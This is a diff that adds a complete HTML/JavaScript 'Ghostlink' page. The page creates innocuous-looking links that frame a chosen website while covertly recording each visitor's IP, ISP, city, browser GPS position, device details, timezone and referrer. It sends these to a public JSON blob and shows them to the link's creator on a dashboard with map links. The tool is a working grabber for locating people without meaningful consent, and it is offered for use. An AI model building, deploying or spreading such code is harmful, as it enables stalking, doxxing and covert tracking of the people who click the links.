@@ -1,0 +1,298 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="robots" content="noindex" />
+<title>Ghostlink — toolz.run.place</title>
+<style>
+  :root{--bg:#0f1115;--fg:#e8eaed;--mut:#9aa0aa;--acc:#4f8cff;--card:#171a21;--line:#252a33}
+  *{box-sizing:border-box}
+  body{margin:0;font:15px/1.55 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--fg)}
+  .wrap{max-width:760px;margin:0 auto;padding:24px 18px 70px}
+  h1{font-size:22px;margin:0 0 6px}
+  h2{font-size:15px;margin:26px 0 8px}
+  p.sub{color:var(--mut);margin:0 0 20px}
+  .back{display:inline-block;font-size:13px;color:var(--mut);text-decoration:none;margin-bottom:18px}
+  .back:hover{color:var(--fg)}
+  label{display:block;font-size:13px;color:var(--mut);margin:16px 0 6px}
+  input{width:100%;padding:11px 12px;border-radius:9px;border:1px solid var(--line);background:var(--card);color:var(--fg);font:inherit}
+  button{cursor:pointer;border:0;border-radius:9px;padding:11px 16px;font:inherit;font-weight:600;background:var(--acc);color:#fff}
+  button.ghost{background:var(--card);color:var(--fg);border:1px solid var(--line)}
+  a{color:var(--acc)}
+  .row{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px;align-items:center}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px;margin-top:14px;word-break:break-all}
+  code{font-size:13px}
+  .mut{color:var(--mut);font-size:13px}
+  table{width:100%;border-collapse:collapse;font-size:13px;margin-top:12px}
+  th,td{text-align:left;padding:9px 6px;border-bottom:1px solid var(--line);vertical-align:top}
+  th{color:var(--mut);font-weight:500;font-size:12px;text-transform:uppercase;letter-spacing:.04em}
+  #frameWrap{position:fixed;inset:0;background:#fff}
+  #frameWrap iframe{width:100%;height:100%;border:0;display:block}
+  #open{position:fixed;right:14px;bottom:14px;z-index:20;background:#000c;color:#fff;padding:9px 14px;border-radius:999px;font-size:13px;text-decoration:none;backdrop-filter:blur(6px)}
+  #splash{position:fixed;inset:0;display:grid;place-items:center;background:#fff;color:#555;font:14px system-ui;z-index:30}
+  footer{position:fixed;left:0;right:0;bottom:0;z-index:19;text-align:center;font:11px system-ui;color:#0009;padding:4px;pointer-events:none}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<div id="splash" hidden>loading…</div>
+<a id="open" hidden target="_blank" rel="noopener">open original ↗</a>
+<footer id="note" hidden>this link logs your IP</footer>
+
+<script>
+(() => {
+"use strict";
+
+/* ================= config ================= */
+const BASE = "/ghostlink";      // මේ tool එක ඉන්න folder එක
+const PRETTY = false;           // 404 shim එක දැම්මට පස්සේ true කරන්න
+
+/* ================= utils ================= */
+const esc = s => String(s ?? "").replace(/[&<>"]/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;" }[c]));
+const rand = (n = 8) => { const a = new Uint8Array(n); crypto.getRandomValues(a); return [...a].map(x => (x % 36).toString(36)).join(""); };
+const linkFor = id => PRETTY ? `${location.origin}${BASE}/s/${id}` : `${location.origin}${BASE}/?l=${id}`;
+const dashFor = (id, k) => PRETTY ? `${location.origin}${BASE}/d/${id}?k=${k}` : `${location.origin}${BASE}/?d=${id}&k=${k}`;
+
+/* ================= storage ================= */
+const Store = {
+  base: "https://jsonblob.com/api/jsonBlob",
+  async create(rec) {
+    const r = await fetch(this.base, { method: "POST", headers: { "Content-Type": "application/json", Accept: "application/json" }, body: JSON.stringify(rec) });
+    if (!r.ok) throw new Error("create " + r.status);
+    const loc = r.headers.get("Location") || r.headers.get("location");
+    if (!loc) throw new Error("no Location header");
+    return loc.split("/").filter(Boolean).pop();
+  },
+  async read(id) {
+    const r = await fetch(`${this.base}/${id}`, { headers: { Accept: "application/json" }, cache: "no-store" });
+    if (!r.ok) throw new Error("read " + r.status);
+    return r.json();
+  },
+  async write(id, rec) {
+    const r = await fetch(`${this.base}/${id}`, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify(rec) });
+    if (!r.ok) throw new Error("write " + r.status);
+  }
+};
+
+/* ================= capture ================= */
+const IP_APIS = [
+  async () => { const j = await (await fetch("https://ipwho.is/")).json(); if (!j.ip) throw 0;
+    return { ip:j.ip, city:j.city, region:j.region, country:j.country, cc:j.country_code, isp:j.connection?.isp, lat:j.latitude, lon:j.longitude }; },
+  async () => { const j = await (await fetch("https://ipapi.co/json/")).json(); if (!j.ip) throw 0;
+    return { ip:j.ip, city:j.city, region:j.region, country:j.country_name, cc:j.country_code, isp:j.org, lat:j.latitude, lon:j.longitude }; },
+  async () => { const j = await (await fetch("https://api.ipify.org?format=json")).json(); if (!j.ip) throw 0;
+    return { ip:j.ip }; }
+];
+async function getIP() {
+  for (const fn of IP_APIS) { try { const d = await fn(); if (d?.ip) return d; } catch {} }
+  return {};
+}
+function getGeo() {
+  return new Promise(res => {
+    if (!navigator.geolocation) return res({});
+    const t = setTimeout(() => res({}), 9000);
+    navigator.geolocation.getCurrentPosition(
+      p => { clearTimeout(t); res({ glat:p.coords.latitude, glon:p.coords.longitude, gacc:Math.round(p.coords.accuracy) }); },
+      () => { clearTimeout(t); res({}); },
+      { timeout: 8000, maximumAge: 60000 }
+    );
+  });
+}
+
+async function logHit(id) {
+  const [ip, geo] = await Promise.all([getIP(), getGeo()]);
+  const hit = {
+    ts: Date.now(), ...ip, ...geo,
+    ua: navigator.userAgent, lang: navigator.language,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    off: new Date().getTimezoneOffset(),
+    scr: `${screen.width}x${screen.height}`, dpr: devicePixelRatio,
+    cores: navigator.hardwareConcurrency || "", mem: navigator.deviceMemory || "",
+    ref: document.referrer, land: location.pathname + location.search
+  };
+  for (let i = 0; i < 3; i++) {
+    try {
+      const rec = await Store.read(id);
+      if (!rec) return;
+      (rec.hits ||= []).push(hit);
+      await Store.write(id, rec);
+      return;
+    } catch { await new Promise(r => setTimeout(r, 500)); }
+  }
+}
+
+/* ================= viewer ================= */
+async function renderViewer(id) {
+  const app = document.getElementById("app");
+  document.getElementById("splash").hidden = false;
+  document.getElementById("note").hidden = false;
+
+  let rec = null;
+  try { rec = await Store.read(id); } catch {}
+  if (!rec?.t) {
+    document.getElementById("splash").hidden = true;
+    app.innerHTML = `<div class="wrap"><h1>Link not found</h1><p class="mut">It may have expired.</p></div>`;
+    return;
+  }
+
+  app.innerHTML = `<div id="frameWrap"><iframe id="f" referrerpolicy="no-referrer-when-downgrade" allow="fullscreen; autoplay; encrypted-media; clipboard-write"></iframe></div>`;
+  const frame = document.getElementById("f");
+  const openBtn = document.getElementById("open");
+  openBtn.href = rec.t;
+
+  let loaded = false;
+  frame.addEventListener("load", () => { loaded = true; document.getElementById("splash").hidden = true; });
+
+  const capture = logHit(id);
+  await Promise.race([capture, new Promise(r => setTimeout(r, 1400))]);
+  frame.src = rec.t;
+
+  setTimeout(() => { if (!loaded) location.replace(rec.t); }, 3500);
+  setTimeout(() => { openBtn.hidden = false; }, 4200);
+}
+
+/* ================= dashboard ================= */
+function mapLink(h) {
+  if (h.glat && h.glon) return `https://www.google.com/maps?q=${h.glat},${h.glon}`;
+  if (h.lat && h.lon) return `https://www.google.com/maps?q=${h.lat},${h.lon}`;
+  if (h.city) return `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(h.city + ", " + (h.country || ""))}`;
+  return "";
+}
+
+async function renderDash(id, k) {
+  const app = document.getElementById("app");
+  document.getElementById("splash").hidden = true;
+
+  let rec = null;
+  try { rec = await Store.read(id); } catch {}
+  if (!rec) { app.innerHTML = `<div class="wrap"><h1>Link not found</h1></div>`; return; }
+  if (rec.k !== k) { app.innerHTML = `<div class="wrap"><h1>Wrong key</h1></div>`; return; }
+
+  const hits = [...(rec.hits || [])].sort((a, b) => b.ts - a.ts);
+  const rows = hits.map((h, i) => {
+    const place = [h.city, h.region, h.country].filter(Boolean).join(", ") || "—";
+    const gps = h.glat ? `<br><span class="mut">GPS ${h.glat.toFixed(4)}, ${h.glon.toFixed(4)} ±${h.gacc}m</span>` : "";
+    const m = mapLink(h);
+    const ua = h.ua ? `<br><span class="mut">${esc(h.ua.slice(0, 90))}</span>` : "";
+    return `<tr>
+      <td>${hits.length - i}</td>
+      <td>${new Date(h.ts).toLocaleString()}<br><span class="mut">${esc(h.tz || "")} UTC${h.off >= 0 ? "-" : "+"}${Math.abs(h.off / 60)}</span></td>
+      <td>${esc(h.ip || "—")}<br><span class="mut">${esc(h.isp || "")}</span></td>
+      <td>${m ? `<a href="${m}" target="_blank" rel="noopener">${esc(place)}</a>` : esc(place)}${gps}</td>
+      <td>${esc(h.scr || "")}${h.dpr ? ` @${h.dpr}x` : ""}<br><span class="mut">${esc(h.cores || "")} cores</span>${ua}</td>
+      <td>${h.ref ? `<span class="mut">${esc(h.ref.slice(0, 60))}</span>` : "—"}</td>
+    </tr>`;
+  }).join("");
+
+  app.innerHTML = `<div class="wrap">
+    <a class="back" href="${BASE}/">← Ghostlink</a>
+    <h1>${esc(rec.label || rec.t)}</h1>
+    <p class="sub">${esc(rec.t)}</p>
+    <div class="row">
+      <span class="mut">${hits.length} opens</span>
+      <button class="ghost" id="refresh">Refresh</button>
+      <button class="ghost" data-copy="${esc(linkFor(id))}">Copy link</button>
+    </div>
+    ${hits.length ? `<table>
+      <thead><tr><th>#</th><th>time</th><th>ip / isp</th><th>place</th><th>device</th><th>referrer</th></tr></thead>
+      <tbody>${rows}</tbody></table>`
+      : `<p class="mut" style="margin-top:20px">No opens yet.</p>`}
+  </div>`;
+
+  document.getElementById("refresh").onclick = () => renderDash(id, k);
+  window.__t = setInterval(() => {
+    if (document.getElementById("refresh")) renderDash(id, k);
+  }, 12000);
+}
+
+/* ================= home ================= */
+function renderHome() {
+  const app = document.getElementById("app");
+  document.getElementById("splash").hidden = true;
+  app.innerHTML = `<div class="wrap">
+    <a class="back" href="https://toolz.run.place/">← toolz.run.place</a>
+    <h1>Ghostlink</h1>
+    <p class="sub">Paste a URL. You get a clean link. Whoever opens it sees the page — and you see where they opened it from.</p>
+    <label for="u">Target URL</label>
+    <input id="u" placeholder="https://example.com/article" autocomplete="off" spellcheck="false" />
+    <label for="n">Label (optional, only you see it)</label>
+    <input id="n" placeholder="Z" autocomplete="off" />
+    <div class="row"><button id="go">Create link</button></div>
+    <div id="out"></div>
+    <div id="recent"></div>
+    <p class="mut" style="margin-top:28px">https required (for GPS). Some sites refuse to be framed — those redirect instead, still recorded. The storage is a public blob, so treat the key as a secret, not a password.</p>
+  </div>`;
+
+  document.getElementById("go").onclick = async () => {
+    const out = document.getElementById("out");
+    let u = document.getElementById("u").value.trim();
+    if (!u) return;
+    if (!/^https?:\/\//i.test(u)) u = "https://" + u;
+    let target;
+    try { target = new URL(u).href; } catch { out.innerHTML = `<p class="mut">Bad URL.</p>`; return; }
+
+    out.innerHTML = `<p class="mut">Creating…</p>`;
+    const rec = { t: target, label: document.getElementById("n").value.trim(), c: Date.now(), k: rand(10), hits: [] };
+    let id;
+    try { id = await Store.create(rec); }
+    catch (e) { out.innerHTML = `<p class="mut">Storage failed: ${esc(e.message)}</p>`; return; }
+
+    const link = linkFor(id);
+    const dash = dashFor(id, rec.k);
+
+    const saved = JSON.parse(localStorage.getItem("gh") || "[]");
+    saved.unshift({ id, dash, target, label: rec.label, c: rec.c });
+    localStorage.setItem("gh", JSON.stringify(saved.slice(0, 60)));
+
+    out.innerHTML = `
+      <div class="card"><div class="mut">Send this:</div><code>${esc(link)}</code>
+        <div class="row"><button class="ghost" data-copy="${esc(link)}">Copy link</button>
+        <a href="${esc(dash)}"><button class="ghost">Dashboard</button></a></div></div>
+      <div class="card"><div class="mut">Dashboard URL — keep it private</div><code>${esc(dash)}</code></div>`;
+    renderRecent();
+  };
+
+  renderRecent();
+}
+
+function renderRecent() {
+  const el = document.getElementById("recent");
+  if (!el) return;
+  const saved = JSON.parse(localStorage.getItem("gh") || "[]");
+  if (!saved.length) return;
+  el.innerHTML = `<h2>Recent</h2>` + saved.map(s =>
+    `<div class="card"><div>${esc(s.label || s.target)}</div>
+     <a href="${esc(s.dash)}" class="mut">dashboard</a></div>`).join("");
+}
+
+document.addEventListener("click", e => {
+  const b = e.target.closest("[data-copy]");
+  if (!b) return;
+  navigator.clipboard.writeText(b.dataset.copy);
+  const old = b.textContent;
+  b.textContent = "Copied";
+  setTimeout(() => { b.textContent = old; }, 1200);
+});
+
+/* ================= router ================= */
+function route() {
+  clearInterval(window.__t);
+  const q = new URLSearchParams(location.search);
+  const p = location.pathname.startsWith(BASE) ? location.pathname.slice(BASE.length).replace(/\/+$/, "") : "";
+  const parts = p.split("/").filter(Boolean);
+  document.getElementById("open").hidden = true;
+  document.getElementById("note").hidden = true;
+
+  if (parts[0] === "s" && parts[1]) return renderViewer(parts[1]);
+  if (parts[0] === "d" && parts[1]) return renderDash(parts[1], q.get("k") || "");
+  if (q.get("l")) return renderViewer(q.get("l"));
+  if (q.get("d")) return renderDash(q.get("d"), q.get("k") || "");
+  renderHome();
+}
+addEventListener("popstate", route);
+route();
+})();
+</script>
+</body>
+</html>
